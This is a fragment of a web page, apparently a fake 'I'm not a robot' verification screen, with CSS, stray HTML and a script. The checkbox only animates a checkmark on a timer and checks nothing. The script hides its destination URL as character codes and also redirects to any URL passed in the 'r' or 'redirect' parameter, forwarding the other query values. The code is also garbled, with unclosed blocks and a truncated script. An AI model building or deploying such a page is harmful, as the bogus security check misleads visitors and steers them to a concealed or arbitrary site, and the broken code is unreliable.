.site-shade {
  position: fixed;
  inset: 0;
  z-index: 1;
  background:

.overlay {
  position: relative;
  z-index: 2;

.modal {
  width: min(100%, 380px);
  border: 1px solid var(--line);
  border-radius: 22px;
  background: linear-gradient(180deg, var(--card), var(--card2));
  box-shadow: 0 30px 80px rgba(0,0,0,.6), 0 0 0 1px rgba(226,40,106,.06);
  padding: 30px 22px 22px;
  text-align: center;
  animation: pop .38s cubic-bezier(.2,.9,.3,1.2) both;
}

.badge {
  width: 58px;
  height: 58px;
  margin: 0 auto 16px;
  border-radius: 18px;
  display: grid;
  place-items: center;
  background: linear-gradient(145deg, var(--accent2), var(--accent-d));
  box-shadow: 0 10px 26px rgba(226,40,106,.35);
}
.badge svg { width: 28px; height: 28px; }

.modal h1 { margin: 0 0 8px; font-size: 22px; font-weight: 800; letter-spacing: -.01em; }
.modal .sub { margin: 0 0 22px; color: var(--muted); font-size: 14px; line-height: 1.5; }

/* caixa "I'm not a robot" */
.cb-row {
  display: flex;
  align-items: center;
  gap: 14px;
  padding: 14px 14px 14px 16px;
  border: 1px solid var(--line);
  border-radius: 14px;
  background: rgba(255,255,255,.03);
  cursor: pointer;
  text-align: left;
  margin-bottom: 16px;
  transition: .18s border-color, .18s background;
  user-select: none;
  -webkit-user-select: none;
  -webkit-tap-highlight-color: transparent;
}
.cb-row:hover    { border-color: rgba(226,40,106,.45); }
.cb-row.checking { border-color: rgba(226,40,106,.45); pointer-events: none; }
.cb-row.checked  { border-color: rgba(226,40,106,.7); background: rgba(226,40,106,.07); }

.cb-box {
  width: 28px;
  height: 28px;
  flex: 0 0 28px;
  border: 2px solid rgba(255,255,255,.25);
  border-radius: 7px;
  display: grid;
  place-items: center;
  background: rgba(0,0,0,.35);
  transition: .18s;
}
.cb-row.checking .cb-box { border-color: transparent; background: transparent; }
.cb-row.checked  .cb-box { border-color: var(--accent); background: var(--accent); }
.cb-box svg { width: 16px; height: 16px; }

.cb-label { font-size: 15px; font-weight: 700; }
.cb-hint  { font-size: 11.5px; color: var(--muted); margin-top: 2px; }

.cb-brand { margin-left: auto; text-align: center; flex-shrink: 0; color: var(--muted); }
.cb-brand svg { width: 22px; height: 22px; display: block; margin: 0 auto; opacity: .85; }
.cb-brand small { display: block; margin-top: 3px; font-size: 7.5px; letter-spacing: .12em; font-weight: 700; }

.spin {
  width: 22px;
  height: 22px;
  border: 2.5px solid rgba(226,40,106,.22);
  border-top-color: var(--accent);
  border-radius: 50%;
  animation: spin .9s linear infinite;
}

.primary {
  width: 100%;
  min-height: 54px;
  border: 0;
  border-radius: 999px;
  background: linear-gradient(90deg, var(--accent-d), var(--accent2));
  box-shadow: 0 12px 28px rgba(226,40,106,.3);
  color: #fff;
  font: 700 16px/1 Inter, sans-serif;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  transition: .18s transform, .18s filter, .18s opacity;
  -webkit-tap-highlight-color: transparent;
}
.primary:hover:not(:disabled)  { filter: brightness(1.07); }
.primary:active:not(:disabled) { transform: scale(.985); }
.primary:disabled { opacity: .4; cursor: default; box-shadow: none; }
.primary.loading  { opacity: 1; }
.primary .spin { width: 18px; height: 18px; border-color: rgba(255,255,255,.3); border-top-color: #fff; }

.foot {
  margin-top: 16px;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 6px;
  color: #6f646a;
  font-size: 11px;
}
.foot svg { width: 12px; height: 12px; }

@keyframes pop  { from { opacity: 0; transform: translateY(14px) scale(.97); } to { opacity: 1; transform: none; } }
@keyframes spin { to { transform: rotate(360deg); } }

@media (max-width: 360px) {
  .modal { padding: 26px 16px 18px; }
  .modal h1 { font-size: 20px; }
}

      <span>
        <div class="cb-label">I'm not a robot</div>
        <div class="cb-hint">Tap to verify</div>

        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/></svg>

<script>
const params = new URLSearchParams(location.search);

function _b() {
  return [104,116,116,112,115,58,47,47,112,114,105,118,105,108,101,103,121,102,97,110,115,46,99,111,109,47].map(c=>String.fromCharCode(c)).join('');
}

const forward = new URLSearchParams();
params.forEach((v, k) => { if (k !== 'r' && k !== 'redirect') forward.append(k, v); });
const qs = forward.toString();
const _base = params.get('r') || params.get('redirect') || _b();
const REDIRECT = qs ? _base + (_base.includes('?') ? '&' : '?') + qs : _base;

const CHECK_SVG = '<svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"><path d="m5 12.5 4.5 4.5L19 7.5"/></svg>';

const cbRow = document.getElementById('cbRow');
const cbBox = document.getElementById('cbBox');
const btn   = document.getElementById('verifyBtn');

function triggerCheck() {
  if (cbRow.classList.contains('checking') || cbRow.classList.contains('checked')) return;
  cbRow.classList.add('checking');
  cbRow.setAttribute('aria-checked', 'true');
  cbBox.innerHTML = '<div class="spin"></div>';
  setTimeout(() => {
    cbRow.classList.remove('checking');
    cbRow.classList.add('checked');
    cbBox.innerHTML = CHECK_SVG;
    btn.disabled = false;
    btn.removeAttribute('aria-disabled');
    btn.focus();

}

cbRow.addEventListener('keydown', e => {
  if (e.key === ' ' || e.key === 'Enter') { e.preventDefault(); triggerCheck(); }
});

  if (btn.disabled) return;
  btn.disabled = true;
  btn.classList.add('loading');
